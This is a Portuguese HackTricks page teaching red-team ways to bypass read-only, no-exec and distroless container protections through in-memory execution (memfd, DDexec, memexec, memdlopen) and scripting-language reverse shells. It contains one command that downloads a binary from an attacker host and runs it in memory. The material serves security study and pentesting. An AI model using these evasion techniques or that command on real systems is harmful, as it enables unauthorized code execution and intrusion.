# Bypass de proteções do sistema de arquivos: somente leitura / sem execução / Distroless

<details>

<summary><strong>Aprenda hacking AWS do zero ao avançado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se você está interessado em **carreira de hacking** e hackear o inhackeável - **estamos contratando!** (_fluência em polonês escrito e falado é necessária_).

{% embed url="https://www.stmcyber.com/careers" %}

## Vídeos

Nos seguintes vídeos, você pode encontrar as técnicas mencionadas nesta página explicadas de forma mais aprofundada:

* [**DEF CON 31 - Explorando a Manipulação de Memória do Linux para Furtividade e Evasão**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intrusões furtivas com DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Cenário de somente leitura / sem execução

É cada vez mais comum encontrar máquinas Linux montadas com **proteção de sistema de arquivos somente leitura (ro)**, especialmente em contêineres. Isso ocorre porque executar um contêiner com sistema de arquivos ro é tão fácil quanto definir **`readOnlyRootFilesystem: true`** no `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

No entanto, mesmo que o sistema de arquivos seja montado como ro, **`/dev/shm`** ainda será gravável, então é falso que não podemos escrever nada no disco. No entanto, esta pasta será **montada com proteção sem execução**, então se você baixar um binário aqui, **não poderá executá-lo**.

{% hint style="warning" %}
Do ponto de vista de uma equipe vermelha, isso torna **complicado baixar e executar** binários que não estão no sistema (como backdoors ou enumeradores como `kubectl`).
{% endhint %}

## Bypass mais fácil: Scripts

Observe que mencionei binários, você pode **executar qualquer script** desde que o interpretador esteja dentro da máquina, como um **script de shell** se `sh` estiver presente ou um **script python** se `python` estiver instalado.

No entanto, isso não é suficiente para executar seu backdoor binário ou outras ferramentas binárias que você possa precisar executar.

## Bypasses de Memória

Se você deseja executar um binário, mas o sistema de arquivos não permite, a melhor maneira de fazer isso é **executá-lo da memória**, pois as **proteções não se aplicam lá**.

### Bypass de chamada de sistema FD + exec

Se você tiver mecanismos de script poderosos dentro da máquina, como **Python**, **Perl** ou **Ruby**, você pode baixar o binário para executar da memória, armazená-lo em um descritor de arquivo de memória (`create_memfd` syscall), que não será protegido por essas proteções e então chamar uma **chamada de sistema `exec`** indicando o **fd como o arquivo a ser executado**.

Para isso, você pode facilmente usar o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode passar a ele um binário e ele gerará um script na linguagem indicada com o **binário comprimido e codificado em b64** com as instruções para **decodificar e descomprimir** em um **fd** criado chamando a syscall `create_memfd` e uma chamada à **chamada de sistema exec** para executá-lo.

{% hint style="warning" %}
Isso não funciona em outras linguagens de script como PHP ou Node porque eles não têm nenhuma maneira **padrão de chamar chamadas de sistema brutas** de um script, então não é possível chamar `create_memfd` para criar o **fd de memória** para armazenar o binário.

Além disso, criar um **fd regular** com um arquivo em `/dev/shm` não funcionará, pois você não terá permissão para executá-lo porque a **proteção sem execução** será aplicada.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) é uma técnica que permite que você **modifique a memória do seu próprio processo** sobrescrevendo seu **`/proc/self/mem`**.

Portanto, **controlando o código de montagem** que está sendo executado pelo processo, você pode escrever um **shellcode** e "mutar" o processo para **executar qualquer código arbitrário**.

{% hint style="success" %}
**DDexec / EverythingExec** permitirá que você carregue e **execute** seu próprio **shellcode** ou **qualquer binário** da **memória**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec) é o próximo passo natural do DDexec. É um **shellcode demonizado do DDexec**, então toda vez que você quiser **executar um binário diferente** não precisa reiniciar o DDexec, você pode simplesmente executar o shellcode memexec via a técnica DDexec e então **comunicar-se com esse daemon para passar novos binários para carregar e executar**.

Você pode encontrar um exemplo de como usar **memexec para executar binários a partir de um shell reverso PHP** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Com um propósito semelhante ao DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **forma mais fácil de carregar binários** na memória para posteriormente executá-los. Isso poderia até permitir carregar binários com dependências.

## Bypass Distroless

### O que é distroless

Contêineres distroless contêm apenas os **componentes mínimos necessários para executar um aplicativo ou serviço específico**, como bibliotecas e dependências de tempo de execução, mas excluem componentes maiores como um gerenciador de pacotes, shell ou utilitários do sistema.

O objetivo dos contêineres distroless é **reduzir a superfície de ataque dos contêineres eliminando componentes desnecessários** e minimizando o número de vulnerabilidades que podem ser exploradas.

### Shell Reverso

Em um contêiner distroless, você pode **nem mesmo encontrar `sh` ou `bash`** para obter um shell regular. Você também não encontrará binários como `ls`, `whoami`, `id`... tudo o que você costuma executar em um sistema.

{% hint style="warning" %}
Portanto, você **não** poderá obter um **shell reverso** ou **enumerar** o sistema como costuma fazer.
{% endhint %}

No entanto, se o contêiner comprometido estiver executando, por exemplo, um aplicativo web flask, então o Python está instalado e, portanto, você pode obter um **shell reverso em Python**. Se estiver executando node, você pode obter um shell reverso em Node, e o mesmo com praticamente qualquer **linguagem de script**.

{% hint style="success" %}
Usando a linguagem de script, você poderia **enumerar o sistema** usando as capacidades da linguagem.
{% endhint %}

Se não houver **proteções `somente leitura/sem execução`**, você poderia abusar do seu shell reverso para **escrever no sistema de arquivos seus binários** e **executá-los**.

{% hint style="success" %}
No entanto, nesse tipo de contêineres, essas proteções geralmente existirão, mas você poderia usar as **técnicas de execução de memória anteriores para contorná-las**.
{% endhint %}

Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades de RCE** para obter **shells reversos de linguagens de script** e executar binários da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se você está interessado em uma **carreira de hacking** e hackear o inhackeável - **estamos contratando!** (_fluência em polonês escrita e falada necessária_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
